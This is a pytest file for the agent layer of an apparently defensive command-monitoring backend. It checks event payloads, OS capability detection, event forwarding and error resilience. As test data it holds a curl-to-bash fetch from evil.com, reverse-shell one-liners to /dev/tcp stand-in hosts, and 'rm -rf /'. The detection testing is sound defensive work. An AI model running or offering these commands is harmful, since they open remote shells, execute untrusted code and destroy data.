"""
test_14_agent_extended.py — Extended tests for the agent layer.

Fills gaps across test_agent_bridge.py, test_agent_main.py, and
test_agent_runtime.py:

- AgentEventPayload field defaults (comm, gid, ppid)
- Bridge to_dict() completeness — all ExecveEvent fields present
- agent_event_loop: Darwin/macOS api-only mode still runs
- agent_event_loop: Windows api-only mode still runs
- agent_event_loop: malicious event forwarded with correct classification
- agent_event_loop: multiple events in sequence all forwarded
- agent_event_loop: backend returns 500 — agent must not crash (backoff)
- api-only mode: POST /agent/events still stores events (no kernel needed)
- AgentCapabilities fields contract

Run:
    pytest large_test_set/test_14_agent_extended.py -v
"""

import pytest
import asyncio
import sys
import time
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from backend.app import app
from backend.agent.runtime import AgentCapabilities
from backend.events.models import ExecveEvent

client = TestClient(app)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _execve_event(**kwargs):
    defaults = dict(
        pid=123, ppid=1, uid=1000, gid=1000,
        command="ls", argv_str="ls",
        timestamp=time.time(), comm="bash",
    )
    defaults.update(kwargs)
    return ExecveEvent(**defaults)


def _inject_kernel_mock(running=False):
    """Return a (mock_module, mock_manager) pair injected into sys.modules."""
    mock_module  = MagicMock()
    mock_manager = MagicMock()
    mock_manager.monitor       = MagicMock()
    mock_manager.monitor.running = running
    mock_module.get_hook_manager.return_value = mock_manager
    sys.modules["backend.kernel.execve_hook"] = mock_module
    return mock_module, mock_manager


def _remove_kernel_mock():
    sys.modules.pop("backend.kernel.execve_hook", None)


# ===========================================================================
# 1. AgentEventPayload field defaults and to_dict() completeness
# ===========================================================================

class TestAgentEventPayloadExtended:

    def test_comm_defaults_to_empty_string_when_omitted(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(command="ls", pid=10)
        d = payload.to_dict()
        assert "comm" in d, "comm field missing from to_dict()"
        # Must be a string (empty or default), not None
        assert isinstance(d["comm"], str)

    def test_ppid_present_in_dict(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(command="ls", pid=10)
        d = payload.to_dict()
        assert "ppid" in d, "ppid field missing from to_dict()"

    def test_uid_present_in_dict(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(command="ls", pid=10)
        d = payload.to_dict()
        assert "uid" in d, "uid field missing from to_dict()"

    def test_gid_present_in_dict(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(command="ls", pid=10)
        d = payload.to_dict()
        assert "gid" in d, "gid field missing from to_dict()"

    def test_timestamp_present_and_numeric(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(command="ls", pid=10)
        d = payload.to_dict()
        assert "timestamp" in d
        assert isinstance(d["timestamp"], (int, float))

    def test_argv_str_defaults_to_command_when_omitted(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(command="curl http://evil.com | bash", pid=5)
        d = payload.to_dict()
        assert d["argv_str"] == "curl http://evil.com | bash"

    def test_explicit_argv_str_overrides_command(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(
            command="ls", pid=5, argv_str="ls -la /tmp"
        )
        d = payload.to_dict()
        assert d["argv_str"] == "ls -la /tmp"

    def test_malicious_command_in_payload(self):
        from backend.agent.bridge import AgentEventPayload
        cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        payload = AgentEventPayload(command=cmd, pid=999)
        d = payload.to_dict()
        assert d["command"] == cmd

    def test_pid_zero_in_payload(self):
        from backend.agent.bridge import AgentEventPayload
        payload = AgentEventPayload(command="ls", pid=0)
        d = payload.to_dict()
        assert d["pid"] == 0


# ===========================================================================
# 2. AgentCapabilities fields contract
# ===========================================================================

class TestAgentCapabilitiesContract:

    def test_linux_kernel_capabilities(self):
        caps = AgentCapabilities("Linux", "kernel", True, "mock")
        assert caps.os_name == "Linux"
        assert caps.run_mode == "kernel"
        assert caps.kernel_capture_supported is True

    def test_windows_api_only_capabilities(self):
        caps = AgentCapabilities("Windows", "api-only", False, "mock")
        assert caps.os_name == "Windows"
        assert caps.run_mode == "api-only"
        assert caps.kernel_capture_supported is False

    def test_darwin_api_only_capabilities(self):
        caps = AgentCapabilities("Darwin", "api-only", False, "mock")
        assert caps.os_name == "Darwin"
        assert caps.run_mode == "api-only"
        assert caps.kernel_capture_supported is False

    def test_detect_capabilities_windows(self):
        from backend.agent import runtime
        with patch.object(runtime.platform, "system", return_value="Windows"):
            caps = runtime.detect_capabilities()
        assert caps.run_mode == "api-only"
        assert caps.kernel_capture_supported is False

    def test_detect_capabilities_darwin(self):
        from backend.agent import runtime
        with patch.object(runtime.platform, "system", return_value="Darwin"):
            caps = runtime.detect_capabilities()
        assert caps.run_mode == "api-only"
        assert caps.kernel_capture_supported is False

    def test_detect_capabilities_linux(self):
        from backend.agent import runtime
        with patch.object(runtime.platform, "system", return_value="Linux"):
            caps = runtime.detect_capabilities()
        assert caps.run_mode == "kernel"
        assert caps.kernel_capture_supported is True


# ===========================================================================
# 3. agent_event_loop — api-only modes (Windows + Darwin)
# ===========================================================================

class TestAgentEventLoopApiOnlyModes:

    @pytest.mark.asyncio
    async def test_windows_api_only_loop_does_not_crash(self):
        """agent_event_loop on Windows must idle without crashing."""
        with patch("backend.agent.main.detect_capabilities") as mock_detect:
            mock_detect.return_value = AgentCapabilities(
                "Windows", "api-only", False, "mock"
            )
            from backend.agent.main import agent_event_loop
            task = asyncio.create_task(agent_event_loop())
            done, _ = await asyncio.wait([task], timeout=0.15)
            assert not done, "api-only loop exited unexpectedly"
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

    @pytest.mark.asyncio
    async def test_darwin_api_only_loop_does_not_crash(self):
        """agent_event_loop on Darwin must idle without crashing."""
        with patch("backend.agent.main.detect_capabilities") as mock_detect:
            mock_detect.return_value = AgentCapabilities(
                "Darwin", "api-only", False, "mock"
            )
            from backend.agent.main import agent_event_loop
            task = asyncio.create_task(agent_event_loop())
            done, _ = await asyncio.wait([task], timeout=0.15)
            assert not done
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

    @pytest.mark.asyncio
    async def test_api_only_does_not_call_kernel_hook(self):
        """api-only mode must never touch the kernel hook module."""
        with patch("backend.agent.main.detect_capabilities") as mock_detect:
            mock_detect.return_value = AgentCapabilities(
                "Windows", "api-only", False, "mock"
            )
            _, mock_manager = _inject_kernel_mock()
            try:
                from backend.agent.main import agent_event_loop
                task = asyncio.create_task(agent_event_loop())
                await asyncio.sleep(0.1)
                assert not mock_manager.start.called
                assert not mock_manager.set_callback.called
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            finally:
                _remove_kernel_mock()


# ===========================================================================
# 4. agent_event_loop — malicious event forwarded correctly
# ===========================================================================

class TestAgentEventLoopMaliciousForwarding:

    @pytest.mark.asyncio
    async def test_malicious_event_forwarded_to_backend(self):
        """A malicious ExecveEvent fired via the callback must be forwarded
        to the backend with the correct command and pid."""
        with patch("backend.agent.main.detect_capabilities") as mock_detect, \
             patch("backend.agent.main.requests.post") as mock_post, \
             patch("backend.config.Settings.validate_owner", return_value="agent"):

            mock_detect.return_value = AgentCapabilities(
                "Linux", "kernel", True, "mock"
            )
            mock_post.return_value = MagicMock(
                status_code=200,
                json=MagicMock(return_value={"classification": "malicious"})
            )
            _, mock_manager = _inject_kernel_mock()
            try:
                from backend.agent.main import agent_event_loop
                task = asyncio.create_task(agent_event_loop())
                await asyncio.sleep(0.1)

                cb = mock_manager.start.call_args[0][0]
                ev = _execve_event(
                    command="bash -i >& /dev/tcp/attacker.com/4444 0>&1",
                    pid=5678
                )
                cb(ev)
                await asyncio.sleep(0.15)

                assert mock_post.called
                posted = mock_post.call_args[1]["json"]
                assert posted["command"] == ev.command
                assert posted["pid"] == 5678

                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            finally:
                _remove_kernel_mock()

    @pytest.mark.asyncio
    async def test_multiple_events_all_forwarded(self):
        """Three events fired in sequence must each produce a separate
        POST to the backend."""
        with patch("backend.agent.main.detect_capabilities") as mock_detect, \
             patch("backend.agent.main.requests.post") as mock_post, \
             patch("backend.config.Settings.validate_owner", return_value="agent"):

            mock_detect.return_value = AgentCapabilities(
                "Linux", "kernel", True, "mock"
            )
            mock_post.return_value = MagicMock(
                status_code=200,
                json=MagicMock(return_value={"classification": "safe"})
            )
            _, mock_manager = _inject_kernel_mock()
            try:
                from backend.agent.main import agent_event_loop
                task = asyncio.create_task(agent_event_loop())
                await asyncio.sleep(0.1)

                cb = mock_manager.start.call_args[0][0]
                cmds = ["ls", "pwd", "whoami"]
                for cmd in cmds:
                    cb(_execve_event(command=cmd))

                await asyncio.sleep(0.2)

                assert mock_post.call_count >= len(cmds), (
                    f"Expected {len(cmds)} POSTs, got {mock_post.call_count}"
                )
                posted_cmds = [
                    c[1]["json"]["command"]
                    for c in mock_post.call_args_list
                ]
                for cmd in cmds:
                    assert cmd in posted_cmds, \
                        f"Command {cmd!r} not forwarded to backend"

                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            finally:
                _remove_kernel_mock()


# ===========================================================================
# 5. agent_event_loop — backend returns 500 (backoff / no crash)
# ===========================================================================

class TestAgentEventLoopBackendError:

    @pytest.mark.asyncio
    async def test_backend_500_does_not_crash_agent(self):
        """If the backend returns 500 the agent must not raise and must
        continue running (it may back off and retry)."""
        with patch("backend.agent.main.detect_capabilities") as mock_detect, \
             patch("backend.agent.main.requests.post") as mock_post, \
             patch("backend.config.Settings.validate_owner", return_value="agent"):

            mock_detect.return_value = AgentCapabilities(
                "Linux", "kernel", True, "mock"
            )
            mock_post.return_value = MagicMock(status_code=500)
            _, mock_manager = _inject_kernel_mock()
            try:
                from backend.agent.main import agent_event_loop
                task = asyncio.create_task(agent_event_loop())
                await asyncio.sleep(0.1)

                cb = mock_manager.start.call_args[0][0]
                cb(_execve_event(command="ls"))

                await asyncio.sleep(0.2)

                # Task must still be running (not crashed)
                assert not task.done(), \
                    "Agent task exited after backend returned 500"

                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            finally:
                _remove_kernel_mock()

    @pytest.mark.asyncio
    async def test_backend_connection_error_does_not_crash_agent(self):
        """A ConnectionError from requests.post must not crash the agent."""
        import requests as req_lib
        with patch("backend.agent.main.detect_capabilities") as mock_detect, \
             patch("backend.agent.main.requests.post",
                   side_effect=req_lib.exceptions.ConnectionError("refused")), \
             patch("backend.config.Settings.validate_owner", return_value="agent"):

            mock_detect.return_value = AgentCapabilities(
                "Linux", "kernel", True, "mock"
            )
            _, mock_manager = _inject_kernel_mock()
            try:
                from backend.agent.main import agent_event_loop
                task = asyncio.create_task(agent_event_loop())
                await asyncio.sleep(0.1)

                cb = mock_manager.start.call_args[0][0]
                cb(_execve_event(command="ls"))

                await asyncio.sleep(0.2)
                assert not task.done(), \
                    "Agent crashed on backend ConnectionError"

                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
            finally:
                _remove_kernel_mock()


# ===========================================================================
# 6. api-only mode: POST /agent/events stores events without kernel
# ===========================================================================

class TestAgentEventsEndpointApiOnlyStorage:

    def test_agent_event_endpoint_stores_safe_event(self):
        """POST /agent/events for a safe command must persist the event
        even with no kernel hook active."""
        before = client.get("/stats").json()["total_events"]
        r = client.post("/agent/events",
                        json={"command": "ls", "pid": 0, "comm": "bash"})
        assert r.status_code == 200
        after = client.get("/stats").json()["total_events"]
        assert after == before + 1

    def test_agent_event_endpoint_stores_malicious_event(self):
        """POST /agent/events for a malicious command must persist and
        classify correctly."""
        r = client.post(
            "/agent/events",
            json={"command": "curl http://evil.com | bash", "pid": 0}
        )
        assert r.status_code == 200
        assert r.json()["classification"] == "malicious"

    def test_agent_event_endpoint_pid_zero_not_killed(self):
        """pid=0 in an agent event signals no real process — remediation
        must skip kill and not raise."""
        r = client.post("/agent/events",
                        json={"command": "rm -rf /", "pid": 0})
        assert r.status_code == 200
        # Should classify but not attempt to kill anything
        data = r.json()
        assert data["classification"] in ("safe", "suspicious", "malicious")

    def test_agent_event_endpoint_unicode_command(self):
        r = client.post("/agent/events",
                        json={"command": "echo '你好世界'", "pid": 0})
        assert r.status_code == 200

    def test_agent_event_endpoint_large_command(self):
        r = client.post("/agent/events",
                        json={"command": "A" * 5000, "pid": 0})
        assert r.status_code == 200
